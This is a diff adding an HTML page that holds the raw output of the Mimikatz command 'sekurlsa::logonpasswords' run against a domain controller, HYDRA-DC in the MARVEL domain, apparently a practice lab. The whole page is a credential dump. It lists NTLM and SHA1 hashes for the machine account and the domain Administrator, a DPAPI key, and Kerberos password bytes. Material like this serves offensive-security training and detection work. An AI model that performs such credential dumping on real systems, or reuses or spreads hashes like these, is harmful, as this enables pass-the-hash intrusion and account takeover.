@@ -1,0 +1,269 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Credential Dumping with Mimikatz data</title>
+</head><body>mimikatz # sekurlsa::logonpasswords<br/>
+<br/>
+Authentication Id : 0 ; 65197 (00000000:0000fead)<br/>
+Session      : Interactive from 1<br/>
+User Name     : DWM-1<br/>
+Domain      : Window Manager<br/>
+Logon Server   : (null)<br/>
+Logon Time    : 30-07-2023 01:54:32<br/>
+SID        : S-1-5-90-0-1<br/>
+    msv :<br/>
+    [00000003] Primary<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * NTLM   : 6aead1dfc2185faa66f312c8d2d8c03d<br/>
+    * SHA1   : 2896a5044ee0d99a0e1b2a8308ed8f6b3e6c22a0<br/>
+    tspkg :<br/>
+    wdigest :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * Password : (null)<br/>
+    kerberos :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL.local<br/>
+    * Password : c0 d1 24 07 12 ec f6 4e ad 68 b9 8a a8 db 63 53 b4 21 cc e1 89 16 70 3c 77 7f c3 f9 56 62 4b c0 18 3a 2e 66 95 d8 f3 22 18 54 d4 9b f2 1d 70 28 b7 69 8b 5f f2 02 7b 4f c2 fc 7c 2d 43 ae a5 c1 73 1b ee c5 b8 74 5b 4d 36 7d 5b a2 d3 9e e6 37 9b 74 d7 e3 74 79 2f 1b c7 ff 48 42 e0 01 a4 ff 1f 30 9f 86 b7 62 e5 00 3b 43 86 34 ba ee 21 b9 58 07 ab 77 72 1d a7 60 27 e6 6c 64 ac c8 49 af 6d 55 d0 5b 7a 6f 9a 35 4a 35 ee 65 86 70 ef 41 55 79 09 f0 07 7f b7 94 fc 43 b8 b7 96 a4 ba b4 f0 5b 87 10 96 32 5e c5 b9 ac 70 cc be b4 bc 9c 60 6d 88 07 98 c2 35 5a ca 27 1b a8 49 89 2c 43 5e de a4 ce 66 88 9f 7b 47 8f 9e 3b 0f 7d 94 53 6c 82 c4 3f ba 7a 1f 75 2c 65 55 30 98 ce 00 ae e6 20 96 3b 83 aa d6 42 cd e3 2b c6 72 c0 72 1d<br/>
+    ssp :<br/>
+    credman :<br/>
+<br/>
+Authentication Id : 0 ; 996 (00000000:000003e4)<br/>
+Session      : Service from 0<br/>
+User Name     : HYDRA-DC$<br/>
+Domain      : MARVEL<br/>
+Logon Server   : (null)<br/>
+Logon Time    : 30-07-2023 01:54:30<br/>
+SID        : S-1-5-20<br/>
+    msv :<br/>
+    [00000003] Primary<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * NTLM   : 6aead1dfc2185faa66f312c8d2d8c03d<br/>
+    * SHA1   : 2896a5044ee0d99a0e1b2a8308ed8f6b3e6c22a0<br/>
+    tspkg :<br/>
+    wdigest :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * Password : (null)<br/>
+    kerberos :<br/>
+    * Username : hydra-dc$<br/>
+    * Domain  : MARVEL.LOCAL<br/>
+    * Password : (null)<br/>
+    ssp :<br/>
+    credman :<br/>
+<br/>
+Authentication Id : 0 ; 46052 (00000000:0000b3e4)<br/>
+Session      : Interactive from 1<br/>
+User Name     : UMFD-1<br/>
+Domain      : Font Driver Host<br/>
+Logon Server   : (null)<br/>
+Logon Time    : 30-07-2023 01:54:29<br/>
+SID        : S-1-5-96-0-1<br/>
+    msv :<br/>
+    [00000003] Primary<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * NTLM   : 6aead1dfc2185faa66f312c8d2d8c03d<br/>
+    * SHA1   : 2896a5044ee0d99a0e1b2a8308ed8f6b3e6c22a0<br/>
+    tspkg :<br/>
+    wdigest :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * Password : (null)<br/>
+    kerberos :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL.local<br/>
+    * Password : c0 d1 24 07 12 ec f6 4e ad 68 b9 8a a8 db 63 53 b4 21 cc e1 89 16 70 3c 77 7f c3 f9 56 62 4b c0 18 3a 2e 66 95 d8 f3 22 18 54 d4 9b f2 1d 70 28 b7 69 8b 5f f2 02 7b 4f c2 fc 7c 2d 43 ae a5 c1 73 1b ee c5 b8 74 5b 4d 36 7d 5b a2 d3 9e e6 37 9b 74 d7 e3 74 79 2f 1b c7 ff 48 42 e0 01 a4 ff 1f 30 9f 86 b7 62 e5 00 3b 43 86 34 ba ee 21 b9 58 07 ab 77 72 1d a7 60 27 e6 6c 64 ac c8 49 af 6d 55 d0 5b 7a 6f 9a 35 4a 35 ee 65 86 70 ef 41 55 79 09 f0 07 7f b7 94 fc 43 b8 b7 96 a4 ba b4 f0 5b 87 10 96 32 5e c5 b9 ac 70 cc be b4 bc 9c 60 6d 88 07 98 c2 35 5a ca 27 1b a8 49 89 2c 43 5e de a4 ce 66 88 9f 7b 47 8f 9e 3b 0f 7d 94 53 6c 82 c4 3f ba 7a 1f 75 2c 65 55 30 98 ce 00 ae e6 20 96 3b 83 aa d6 42 cd e3 2b c6 72 c0 72 1d<br/>
+    ssp :<br/>
+    credman :<br/>
+<br/>
+Authentication Id : 0 ; 45918 (00000000:0000b35e)<br/>
+Session      : Interactive from 1<br/>
+User Name     : UMFD-1<br/>
+Domain      : Font Driver Host<br/>
+Logon Server   : (null)<br/>
+Logon Time    : 30-07-2023 01:54:29<br/>
+SID        : S-1-5-96-0-1<br/>
+    msv :<br/>
+    [00000003] Primary<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * NTLM   : 6aead1dfc2185faa66f312c8d2d8c03d<br/>
+    * SHA1   : 2896a5044ee0d99a0e1b2a8308ed8f6b3e6c22a0<br/>
+    tspkg :<br/>
+    wdigest :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * Password : (null)<br/>
+    kerberos :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL.local<br/>
+    * Password : c0 d1 24 07 12 ec f6 4e ad 68 b9 8a a8 db 63 53 b4 21 cc e1 89 16 70 3c 77 7f c3 f9 56 62 4b c0 18 3a 2e 66 95 d8 f3 22 18 54 d4 9b f2 1d 70 28 b7 69 8b 5f f2 02 7b 4f c2 fc 7c 2d 43 ae a5 c1 73 1b ee c5 b8 74 5b 4d 36 7d 5b a2 d3 9e e6 37 9b 74 d7 e3 74 79 2f 1b c7 ff 48 42 e0 01 a4 ff 1f 30 9f 86 b7 62 e5 00 3b 43 86 34 ba ee 21 b9 58 07 ab 77 72 1d a7 60 27 e6 6c 64 ac c8 49 af 6d 55 d0 5b 7a 6f 9a 35 4a 35 ee 65 86 70 ef 41 55 79 09 f0 07 7f b7 94 fc 43 b8 b7 96 a4 ba b4 f0 5b 87 10 96 32 5e c5 b9 ac 70 cc be b4 bc 9c 60 6d 88 07 98 c2 35 5a ca 27 1b a8 49 89 2c 43 5e de a4 ce 66 88 9f 7b 47 8f 9e 3b 0f 7d 94 53 6c 82 c4 3f ba 7a 1f 75 2c 65 55 30 98 ce 00 ae e6 20 96 3b 83 aa d6 42 cd e3 2b c6 72 c0 72 1d<br/>
+    ssp :<br/>
+    credman :<br/>
+<br/>
+Authentication Id : 0 ; 45815 (00000000:0000b2f7)<br/>
+Session      : Interactive from 0<br/>
+User Name     : UMFD-0<br/>
+Domain      : Font Driver Host<br/>
+Logon Server   : (null)<br/>
+Logon Time    : 30-07-2023 01:54:29<br/>
+SID        : S-1-5-96-0-0<br/>
+    msv :<br/>
+    [00000003] Primary<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * NTLM   : 6aead1dfc2185faa66f312c8d2d8c03d<br/>
+    * SHA1   : 2896a5044ee0d99a0e1b2a8308ed8f6b3e6c22a0<br/>
+    tspkg :<br/>
+    wdigest :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * Password : (null)<br/>
+    kerberos :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL.local<br/>
+    * Password : c0 d1 24 07 12 ec f6 4e ad 68 b9 8a a8 db 63 53 b4 21 cc e1 89 16 70 3c 77 7f c3 f9 56 62 4b c0 18 3a 2e 66 95 d8 f3 22 18 54 d4 9b f2 1d 70 28 b7 69 8b 5f f2 02 7b 4f c2 fc 7c 2d 43 ae a5 c1 73 1b ee c5 b8 74 5b 4d 36 7d 5b a2 d3 9e e6 37 9b 74 d7 e3 74 79 2f 1b c7 ff 48 42 e0 01 a4 ff 1f 30 9f 86 b7 62 e5 00 3b 43 86 34 ba ee 21 b9 58 07 ab 77 72 1d a7 60 27 e6 6c 64 ac c8 49 af 6d 55 d0 5b 7a 6f 9a 35 4a 35 ee 65 86 70 ef 41 55 79 09 f0 07 7f b7 94 fc 43 b8 b7 96 a4 ba b4 f0 5b 87 10 96 32 5e c5 b9 ac 70 cc be b4 bc 9c 60 6d 88 07 98 c2 35 5a ca 27 1b a8 49 89 2c 43 5e de a4 ce 66 88 9f 7b 47 8f 9e 3b 0f 7d 94 53 6c 82 c4 3f ba 7a 1f 75 2c 65 55 30 98 ce 00 ae e6 20 96 3b 83 aa d6 42 cd e3 2b c6 72 c0 72 1d<br/>
+    ssp :<br/>
+    credman :<br/>
+<br/>
+Authentication Id : 0 ; 256703 (00000000:0003eabf)<br/>
+Session      : Interactive from 1<br/>
+User Name     : Administrator<br/>
+Domain      : MARVEL<br/>
+Logon Server   : HYDRA-DC<br/>
+Logon Time    : 30-07-2023 01:56:16<br/>
+SID        : S-1-5-21-1232359821-2011282127-2883546489-500<br/>
+    msv :<br/>
+    [00000003] Primary<br/>
+    * Username : Administrator<br/>
+    * Domain  : MARVEL<br/>
+    * NTLM   : 920ae267e048417fcfe00f49ecbd4b33<br/>
+    * SHA1   : 980b0585a46a18e462561c0dd564fa1fef27f2bf<br/>
+    * DPAPI  : cf7045c8e47b822adf8a46763dde58dd<br/>
+    tspkg :<br/>
+    wdigest :<br/>
+    * Username : Administrator<br/>
+    * Domain  : MARVEL<br/>
+    * Password : (null)<br/>
+    kerberos :<br/>
+    * Username : Administrator<br/>
+    * Domain  : MARVEL.LOCAL<br/>
+    * Password : (null)<br/>
+    ssp :<br/>
+    credman :<br/>
+<br/>
+Authentication Id : 0 ; 997 (00000000:000003e5)<br/>
+Session      : Service from 0<br/>
+User Name     : LOCAL SERVICE<br/>
+Domain      : NT AUTHORITY<br/>
+Logon Server   : (null)<br/>
+Logon Time    : 30-07-2023 01:54:34<br/>
+SID        : S-1-5-19<br/>
+    msv :<br/>
+    tspkg :<br/>
+    wdigest :<br/>
+    * Username : (null)<br/>
+    * Domain  : (null)<br/>
+    * Password : (null)<br/>
+    kerberos :<br/>
+    * Username : (null)<br/>
+    * Domain  : (null)<br/>
+    * Password : (null)<br/>
+    ssp :<br/>
+    credman :<br/>
+<br/>
+Authentication Id : 0 ; 65216 (00000000:0000fec0)<br/>
+Session      : Interactive from 1<br/>
+User Name     : DWM-1<br/>
+Domain      : Window Manager<br/>
+Logon Server   : (null)<br/>
+Logon Time    : 30-07-2023 01:54:32<br/>
+SID        : S-1-5-90-0-1<br/>
+    msv :<br/>
+    [00000003] Primary<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * NTLM   : 6aead1dfc2185faa66f312c8d2d8c03d<br/>
+    * SHA1   : 2896a5044ee0d99a0e1b2a8308ed8f6b3e6c22a0<br/>
+    tspkg :<br/>
+    wdigest :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * Password : (null)<br/>
+    kerberos :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL.local<br/>
+    * Password : c0 d1 24 07 12 ec f6 4e ad 68 b9 8a a8 db 63 53 b4 21 cc e1 89 16 70 3c 77 7f c3 f9 56 62 4b c0 18 3a 2e 66 95 d8 f3 22 18 54 d4 9b f2 1d 70 28 b7 69 8b 5f f2 02 7b 4f c2 fc 7c 2d 43 ae a5 c1 73 1b ee c5 b8 74 5b 4d 36 7d 5b a2 d3 9e e6 37 9b 74 d7 e3 74 79 2f 1b c7 ff 48 42 e0 01 a4 ff 1f 30 9f 86 b7 62 e5 00 3b 43 86 34 ba ee 21 b9 58 07 ab 77 72 1d a7 60 27 e6 6c 64 ac c8 49 af 6d 55 d0 5b 7a 6f 9a 35 4a 35 ee 65 86 70 ef 41 55 79 09 f0 07 7f b7 94 fc 43 b8 b7 96 a4 ba b4 f0 5b 87 10 96 32 5e c5 b9 ac 70 cc be b4 bc 9c 60 6d 88 07 98 c2 35 5a ca 27 1b a8 49 89 2c 43 5e de a4 ce 66 88 9f 7b 47 8f 9e 3b 0f 7d 94 53 6c 82 c4 3f ba 7a 1f 75 2c 65 55 30 98 ce 00 ae e6 20 96 3b 83 aa d6 42 cd e3 2b c6 72 c0 72 1d<br/>
+    ssp :<br/>
+    credman :<br/>
+<br/>
+Authentication Id : 0 ; 46027 (00000000:0000b3cb)<br/>
+Session      : Interactive from 0<br/>
+User Name     : UMFD-0<br/>
+Domain      : Font Driver Host<br/>
+Logon Server   : (null)<br/>
+Logon Time    : 30-07-2023 01:54:29<br/>
+SID        : S-1-5-96-0-0<br/>
+    msv :<br/>
+    [00000003] Primary<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * NTLM   : 6aead1dfc2185faa66f312c8d2d8c03d<br/>
+    * SHA1   : 2896a5044ee0d99a0e1b2a8308ed8f6b3e6c22a0<br/>
+    tspkg :<br/>
+    wdigest :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * Password : (null)<br/>
+    kerberos :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL.local<br/>
+    * Password : c0 d1 24 07 12 ec f6 4e ad 68 b9 8a a8 db 63 53 b4 21 cc e1 89 16 70 3c 77 7f c3 f9 56 62 4b c0 18 3a 2e 66 95 d8 f3 22 18 54 d4 9b f2 1d 70 28 b7 69 8b 5f f2 02 7b 4f c2 fc 7c 2d 43 ae a5 c1 73 1b ee c5 b8 74 5b 4d 36 7d 5b a2 d3 9e e6 37 9b 74 d7 e3 74 79 2f 1b c7 ff 48 42 e0 01 a4 ff 1f 30 9f 86 b7 62 e5 00 3b 43 86 34 ba ee 21 b9 58 07 ab 77 72 1d a7 60 27 e6 6c 64 ac c8 49 af 6d 55 d0 5b 7a 6f 9a 35 4a 35 ee 65 86 70 ef 41 55 79 09 f0 07 7f b7 94 fc 43 b8 b7 96 a4 ba b4 f0 5b 87 10 96 32 5e c5 b9 ac 70 cc be b4 bc 9c 60 6d 88 07 98 c2 35 5a ca 27 1b a8 49 89 2c 43 5e de a4 ce 66 88 9f 7b 47 8f 9e 3b 0f 7d 94 53 6c 82 c4 3f ba 7a 1f 75 2c 65 55 30 98 ce 00 ae e6 20 96 3b 83 aa d6 42 cd e3 2b c6 72 c0 72 1d<br/>
+    ssp :<br/>
+    credman :<br/>
+<br/>
+Authentication Id : 0 ; 43596 (00000000:0000aa4c)<br/>
+Session      : UndefinedLogonType from 0<br/>
+User Name     : (null)<br/>
+Domain      : (null)<br/>
+Logon Server   : (null)<br/>
+Logon Time    : 30-07-2023 01:54:23<br/>
+SID        :<br/>
+    msv :<br/>
+    [00000003] Primary<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * NTLM   : 6aead1dfc2185faa66f312c8d2d8c03d<br/>
+    * SHA1   : 2896a5044ee0d99a0e1b2a8308ed8f6b3e6c22a0<br/>
+    tspkg :<br/>
+    wdigest :<br/>
+    kerberos :<br/>
+    ssp :<br/>
+    credman :<br/>
+<br/>
+Authentication Id : 0 ; 999 (00000000:000003e7)<br/>
+Session      : UndefinedLogonType from 0<br/>
+User Name     : HYDRA-DC$<br/>
+Domain      : MARVEL<br/>
+Logon Server   : (null)<br/>
+Logon Time    : 30-07-2023 01:54:22<br/>
+SID        : S-1-5-18<br/>
+    msv :<br/>
+    tspkg :<br/>
+    wdigest :<br/>
+    * Username : HYDRA-DC$<br/>
+    * Domain  : MARVEL<br/>
+    * Password : (null)<br/>
+    kerberos :<br/>
+    * Username : hydra-dc$<br/>
+    * Domain  : MARVEL.LOCAL<br/>
+    * Password : (null)<br/>
+    ssp :<br/>
+    credman :<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
